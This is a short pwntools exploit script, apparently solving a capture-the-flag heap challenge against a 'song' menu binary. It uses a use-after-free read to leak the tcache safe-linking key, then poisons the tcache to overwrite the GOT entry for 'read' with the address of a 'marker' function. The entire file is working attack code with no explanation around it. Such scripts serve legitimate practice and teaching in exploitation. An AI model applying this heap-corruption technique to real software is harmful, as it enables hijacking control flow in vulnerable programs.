#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

def add_song(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(size).encode())

def view_song(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Your song:\n")
    return io.recvline()

def edit_song(idx, content):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", content)

def delete_song(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

io = process(exe.path)

#GOT Overwrite
add_song(0, 0x30)
add_song(1, 0x30)
add_song(2, 0x30)
delete_song(0)
key = u64(view_song(0)[:8])
delete_song(1)
delete_song(2)
#tcache: 2->1->0
edit_song(2, p64(exe.got["read"]^key))
add_song(3, 0x30)
add_song(4, 0x30)
edit_song(4, p64(exe.sym["marker"]))
edit_song(0, b"any")

io.wait_for_close()

exit(io.poll())


#GOT overwrite with address of function